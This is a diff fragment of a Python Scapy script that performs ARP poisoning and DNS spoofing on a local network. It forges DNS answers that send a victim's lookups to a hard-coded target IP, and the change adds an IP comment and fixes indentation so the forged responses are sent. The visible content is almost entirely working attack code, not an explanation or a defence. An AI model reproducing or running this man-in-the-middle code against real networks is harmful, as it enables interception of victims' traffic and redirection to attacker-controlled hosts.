@@ -10,7 +10,7 @@ localMAC = "00:0c:29:19:18:f6"
 routerMAC = "00:50:56:f7:bc:e1"
 routerIP = "192.168.28.2"
 global targetIP
-targetIP = "54.194.124.171"
+targetIP = "54.194.124.171" # REMA IP 
 
 def arpPoison(localMAC, victimMAC, routerMAC):
 
@@ -46,10 +46,10 @@ def checkPacket(packet):
 		response_packet = (IP(dst=victimIP, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
 DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=targetIP)))
 
-	send(response_packet, verbose=0)
+		send(response_packet, verbose=0)
 
-	print ("DNS Requested: ", packet[DNS].qd.qname)
-	print ("Received: "+ str(targetIP))
+		print ("DNS Requested: ", packet[DNS].qd.qname)
+		print ("Received: "+ str(targetIP))
 
         
 
